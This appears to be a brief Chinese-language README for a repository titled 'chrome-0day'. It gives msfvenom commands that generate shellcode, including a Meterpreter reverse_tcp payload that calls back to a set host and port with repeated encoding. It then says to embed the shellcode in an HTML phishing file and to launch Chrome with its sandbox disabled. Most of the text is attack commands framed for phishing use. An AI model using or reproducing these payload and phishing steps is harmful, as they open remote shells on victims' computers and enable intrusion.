# chrome-0day
### 生成shellcode代码



```msfvenom -a x86 -p windows/exec CMD="calc" EXITFUNC=thread -f num```



msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=5555 -e x86/shikata_ga_nai -b "\x00" -i 15 -f num -o payload.c



### 制作html钓鱼文件



将生成的代码放入html中shellcode[]中。

浏览器关闭沙盒并打开网页

```
chrome.exe --no-sanbox /path/to/exploit.html
```





